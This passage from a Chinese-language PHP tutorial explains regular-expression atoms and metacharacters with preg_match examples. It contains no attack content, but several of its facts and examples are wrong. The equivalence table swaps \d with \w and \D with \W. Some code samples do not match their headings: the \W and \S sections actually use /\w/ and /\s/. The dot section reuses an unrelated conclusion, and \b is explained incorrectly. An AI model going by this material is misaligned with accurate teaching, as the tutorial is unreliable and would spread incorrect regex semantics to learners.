<p>因上，$string这个变量的w字符后存在一个空格。所以匹配成功，输出了字符串类型，长度为1。只不过我们的肉眼不可见，看不到这个字符串而已。</p>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="4-特殊标识的原子"><a href="#4-特殊标识的原子" class="headerlink" title="4. 特殊标识的原子"></a><font face="Comic sans MS" color="#FF6347">4. 特殊标识的原子</font></h3><table>
<thead>
<tr>
<th align="center">原子</th>
<th align="left">说明</th>
<th align="left">等价式</th>
</tr>
</thead>
<tbody><tr>
<td align="center">\d</td>
<td align="left">匹配一个0-9</td>
<td align="left">[a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\D</td>
<td align="left">除了0-9以外的所有字符</td>
<td align="left">[^a-zA-Z0-9_]</td>
</tr>
<tr>
<td align="center">\w</td>
<td align="left">a-zA-Z0-9_</td>
<td align="left">[0-9]</td>
</tr>
<tr>
<td align="center">\W</td>
<td align="left">除了0-9A-Za-z_以外的所有字符</td>
<td align="left">[^0-9]</td>
</tr>
<tr>
<td align="center">\s</td>
<td align="left">匹配所有空白字符\n \t \r 空格</td>
<td align="left">[ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">\S</td>
<td align="left">匹配所有非空白字符</td>
<td align="left">[^ \t\n\f\r]</td>
</tr>
<tr>
<td align="center">[ ]</td>
<td align="left">指定范围的原子</td>
<td align="left"></td>
</tr>
</tbody></table>
<p><font color="#FF6347">这个个需要记住，最好达到默写级别。记忆的时候成对记忆，\d是匹配一个0-9，那么\D 就是除了0-9以外的所有字符。上面已经说明的很清楚了，我们进行实验一步一步对这些进行学习。</font></p>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. \d匹配一个0-9</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;我爱喝9你爱不爱喝&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. \D匹配一个非0-9的值</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\D/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;121243中23453453&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了中。因为它不是0-9之间的字符。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. \w匹配一个a-zA-Z0-9_</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;新中_国万岁呀万岁&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，匹配到了下划线。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. \W匹配一个非a-zA-Z0-9_</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;afasABCWEQR44231284737&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配失败。因为，上面上面全是a-zA-Z0-9_，没有非a-zA-Z0-9_。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. \s 匹配所有空白字符\n \t \r 空格</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;中国万</span></span><br><span class="line"><span class="string">岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，因为有一个回车。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. \S 非空字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\s/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;        </span></span><br><span class="line"><span class="string">         a       &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功。虽然上面有空格，回车和缩进。但是，有一个非空白字符a。因此，匹配成功。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. [] 指定范围的原子</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[0-5]\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;6a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;1C&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>上例中0-5匹配$string失败，而$string1成功。因为，$string中的第一个数值为6，不在[0-5]的范围之内。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[a-zA-Z0-9_]\w/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ab&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;9A&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string和$string1都匹配成功。因为\w就是[a-zA-Z0-9_]</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[abc]\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;a9&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;b1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&#x27;c5&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;d4&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：$string、$string1、$string2匹配成功，而$string3不成功。因为$string3超过了[abc]的范围，它是从d开始的。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. [^ 字符] 不匹配指定区间的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/[^0-9A-Za-z_]/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;aaaaab311dd&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&#x27;!$@!#%$#^##&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：</p>
<ol>
<li>匹配$string不成功，但是匹配$string1的时候成功。因为中括号里面有个抑扬符。</li>
<li>^ 抑扬符在中括号里面的作用是不准以中括号里面的字符进行匹配。</li>
</ol>
</blockquote>
<p>&amp;emsp;</p>
<h3 id="5-元字符"><a href="#5-元字符" class="headerlink" title="5. 元字符"></a><font face="Comic sans MS" color="#FF6347">5. 元字符</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>抛出问题：</strong></font>\d 代表匹配一个字符。而我现在想要匹配十个八个，任意多个数字肿么办？<br>这个时候我们就要用到元字符。在使用原子的时候，发现只能够匹配一个字符，可是要匹配多个字符就出现了问题。<br>这个时候，我们需要借助<font color="#00B2EE">元字符</font>来帮我们修饰原子，实现更多的功能。<br></font></p>
<table>
<thead>
<tr>
<th align="center">元字符</th>
<th align="left">功能说明</th>
</tr>
</thead>
</table>
<ul>
<li>| 是代表匹配前面的一个原子，匹配0次或者任意多次前面的字符。</li>
</ul>
<ul>
<li>| 匹配一次或多前前面的一个字符<br>?    | 前面的字符可有可无【可选】 有或没有<br>.    | 更标准一些应该把点算作原子。匹配除了\n以外的所有字符<br>丨    | 或者。注：它的优先级最低了。<br>^    | 必须要以抑扬符之后的字符串开始<br>$    | 必须要以$之前的字符结尾<br>\b    | 词边界<br>\B    | 非边界<br>{m}    | 有且只能出现m次<br>{n,m}|     可以出现n到m次<br>{m,} |    至少m次，最大次数不限制<br>()     |  改变优先级或者将某个字符串视为一个整体，匹配到的数据取出来也可以使用它</li>
</ul>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1. + 匹配最少1次前面的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪250都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string</span> = <span class="string">&quot;迪奥和奥迪都是我最爱&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配成功，证明了\d+中的+。\d是匹配数字，而+是最少匹配一次前面的字符。</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>2. * 匹配0次或者任意多次前面的字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w*/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;!@!@!!@#@!<span class="variable">$@</span>#!&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;!@#!@#!abcABC#@#!&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明，注释掉的$string1和$string都匹配成功了。因为，\w是匹配的0-9A-Za-z_，而*是说明前面的\w可以不存在。如果存在可以有1个或者多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>3. ? 前面的字符出现0次或者1次，可有可无</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ABC\d?ABC/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line">//待会儿再试试中间没有0-9的情况</span><br><span class="line">//<span class="variable">$string1</span> = <span class="string">&quot;ABC888888ABC&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;ABCABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>4. . (点) 匹配除\n以外的所有字符</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/gg.+gg/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;ABC1ABC&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>匹配$string,$string2成功，但是匹配$string1失败。<br>因为匹配前后都是ABC，中间是一个0-9。0-9可有可无，但是不能有多个。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>5. |（竖线），或者，优先级最低</strong></font><br></font></p>
<p>我们通过实验来看优先级和或者的匹配</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/abc|bcd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;abccd&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看看：<br>    1.最开始我匹配的想法是想匹配的是abccd或者是abbcd。可是，匹配$string1和$string2，匹配出来的结果却是abc和bcd.<br>    2.实现了或者匹配，匹配出来了abc或者是bcd。它还没有字符串连续在一起的优先级高。</p>
<p>那么问题来了，我要匹配上例中的abccd或者是abbcd怎么办？<br><font color="red">需要使用到**()**来改变优先级。</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ab(c|b)cd/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;起来abccd阅兵&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;ggggbcd&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&#x27;中国abbcd未来&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(2) &#123; [0]=&gt; string(5) <span class="string">&quot;abccd&quot;</span> [1]=&gt; string(1) <span class="string">&quot;c&quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.确实匹配了了abccd或者abbcd（$string1 or $string3）。<br>   2.但是匹配的数组里面多了一个元素，这个元素的下标为1<br>   3.()中的内容只要匹配成功，会把匹配到的数据放到下标为1的这个数组元素中。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>6. ^ （抑扬符），必须要以^之后的字符串开始</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/^猪哥好帅\w+/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;猪哥好帅abccdaaaasds&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span>没有以猪哥好帅开始</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;帅abccdaaaasds&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>通过实验发现以下结论：<br>   1.$string1匹配成功，$string2没有匹配成功<br>   2.因为$string1是以指定的字符开始的<br>   3.而$string2并没有以^之后的字符开始<br>   4.翻译这个正则的意思就是：以要猪哥好帅开始后面接a-zA-Z0-9_最少一个字符。</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>7. $ （美元符）必须要以$之前的字符结束</strong></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\d+努力$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;12321124333努力&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span></span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;12311124112313力&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>我们运行一下看一下结果，得出来的结论：<br>   1.$string1 匹配成功，而$string2匹配不成功<br>   2.$之前的字符是\d+，后面接着中文的努力。<br>   3.因此，匹配的是这一个整体。\d指的是0-9的整型,+号代表最少一个0-9</p>
</blockquote>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>8. \b和\B 词边界和非词边界</strong></font><br></font></p>
<p>我们来讲解什么是边界：</p>
<p>   1.正则表达示是有边界的，这个边界是定界符的开始和结尾是正则的边界。</p>
<p>   2.this是一个英文单词，后面加上一个空格，意味着这个词结束了，到达了这个词的边界</p>
<p>\b词边界，就是指必须要在最前或者最后。<br>\B非边界，就是不能在一个正则表达示的最前或者最后。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\w+\b/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;this is a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string2</span> = <span class="string">&quot;thisis a apple&quot;</span>;</span><br><span class="line"><span class="variable">$string3</span> = <span class="string">&quot;thisisaapple&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>结论：<br>   1.$string1、$string2和$string3都匹配成功。<br>   2.$string1匹配的时候this 空格是边界<br>   3.$string2匹配的时候thisis是边界<br>   4.$string3匹配的时候，thisisaapple到了整个正则表达示的最后，因此也是边界。所以匹配成功。</p>
</blockquote>
<p>我们来实验一下非词边界：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/\Bthis/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$string1</span> = <span class="string">&quot;hellothis9&quot;</span>;</span><br><span class="line"></span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;hello this9&quot;</span>;</span><br><span class="line">//<span class="variable">$string2</span> = <span class="string">&quot;this9中国万岁&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="variable">$zz</span>, <span class="variable">$string1</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
